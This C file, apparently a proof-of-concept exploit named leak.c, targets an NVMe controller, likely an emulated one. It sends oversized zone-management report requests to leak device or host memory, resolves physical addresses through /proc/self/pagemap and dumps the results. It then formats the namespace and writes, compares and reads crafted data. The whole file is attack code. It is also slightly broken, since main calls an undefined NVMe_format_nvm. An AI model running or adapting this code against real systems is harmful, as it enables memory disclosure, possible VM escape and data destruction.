// gcc leak.c -o leak

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

#include "ioctl.h"

int nvme_write(struct nvme_io_args *args);
int nvme_read(struct nvme_io_args *args);
int nvme_fdp_reclaim_unit_handle_status(int fd, __u32 nsid, __u32 data_len, void *data);
static uintptr_t virt2phys(uintptr_t addr);
static void dump(void *buf, size_t size);

static int NVMe_format(int fd, uint8_t lbaf, uint32_t *result){
	struct nvme_format_nvm_args format = {
		.result = result,
		.fd = fd,
		.args_size = sizeof(struct nvme_format_nvm_args),
		.nsid = 1,
		.pi = 1,
		.lbaf = lbaf,
		.timeout = NVME_DEFAULT_IOCTL_TIMEOUT,
	};
	return nvme_format_nvm(&format);
}

static int NVMe_write(int fd, uint64_t slba, uint16_t count, void *buf, uint32_t buf_len, uint32_t *result){
	struct nvme_io_args args = {
		.slba = slba,
		.result = result,
		.data = buf,
		.args_size = sizeof(struct nvme_io_args),
		.fd = fd,
		.nsid = 1,
		.data_len = buf_len,
		.nlb = count-1,
		.timeout = NVME_DEFAULT_IOCTL_TIMEOUT,
	};
	return nvme_write(&args);
}

static int NVMe_read(int fd, uint64_t slba, uint16_t count, void *buf, uint32_t buf_len, uint32_t *result){
	struct nvme_io_args args = {
		.slba = slba,
		.result = result,
		.data = buf,
		.args_size = sizeof(struct nvme_io_args),
		.fd = fd,
		.nsid = 1,
		.data_len = buf_len,
		.nlb = count-1,
		.timeout = NVME_DEFAULT_IOCTL_TIMEOUT,
	};
	return nvme_read(&args);
}

static int NVMe_compare(int fd, uint64_t slba, uint16_t count, void *buf, uint32_t buf_len, uint32_t *result){
	struct nvme_io_args args = {
		.slba = slba,
		.result = result,
		.data = buf,
		.args_size = sizeof(struct nvme_io_args),
		.fd = fd,
		.nsid = 1,
		.data_len = buf_len,
		.nlb = count-1,
		.timeout = NVME_DEFAULT_IOCTL_TIMEOUT,
	};
	return nvme_compare(&args);
}

static int NVMe_zone_mgmt_recv(int fd, uint64_t slba, void *buf, uint32_t buf_len, uint32_t *result){
	return nvme_zns_report_zones(fd, 1, slba, 0, false, false, buf_len, buf, NVME_DEFAULT_IOCTL_TIMEOUT, result);
}

#define BUFSIZE 0x200*3

int main(void){
	int fd_dev_nvme;

	char buf[BUFSIZE];

	int ret;
	__u32 result;

	printf("buf: %p (%#lx)\n", buf, virt2phys((uintptr_t)buf));

	fd_dev_nvme = open("/dev/nvme0", O_RDONLY);

	NVMe_zone_mgmt_recv(fd_dev_nvme, 0, buf, 0x68, &result);
	dump(buf, sizeof(buf));

	for(int i=0; i<7; i++)
		NVMe_zone_mgmt_recv(fd_dev_nvme, 0, buf, 0x208, &result);

	// nvme_fdp_reclaim_unit_handle_status(fd_dev_nvme, 1, sizeof(buf), buf);
	// dump(buf, sizeof(buf));

	ret = NVMe_format_nvm(fd_dev_nvme, 1, &result);
	printf("format: %d, %d\n", ret, result);
	getchar();

	getchar();
	memset(buf, 'A', 0x200);
	ret = NVMe_write(fd_dev_nvme, 0, 1, buf, 0x200, &result);
	printf("write: %d, %d\n", ret, result);

	getchar();
	memset(buf, 'X', sizeof(buf));
	uint64_t *p = buf+0x200;
	p[1] = 0x114514;
	p[2] = p[3] = 0xdeadbeef;

	ret = NVMe_compare(fd_dev_nvme, 0, 2, buf, 0x200*2, &result);
	printf("compare: %d, %d\n", ret, result);

	for(int i=0; i<3;i++){
		memset(buf, 0xff, sizeof(buf)/2);

		ret = NVMe_read(fd_dev_nvme, i, 1, buf, 0x200, &result);
		printf("read: %d, %d\n", ret, result);

		dump(buf, 0x200);
	}

	return 0;
}

static uintptr_t virt2phys(uintptr_t addr) {
	static int map_fd = -1;

	if(map_fd < 0)
		map_fd = open("/proc/self/pagemap", O_RDONLY);

	lseek(map_fd, sizeof(uintptr_t)*(addr >> 12), SEEK_SET);

	uint64_t pfn;
	if(read(map_fd, &pfn, sizeof(pfn)) < sizeof(pfn))
		return -1;
	
	if(!(pfn & (1UL<<63)))
		return -1;

	// printf("virt : 0x%016lx -> phys : 0x%016lx\n", addr & ~((1<<12)-1), pfn << 12);

	return (pfn << 12) | (addr & ((1<<12)-1));
}

static void dump(void *buf, size_t size){
	uint64_t *p = buf;

	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(uint64_t i=0; i<size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}
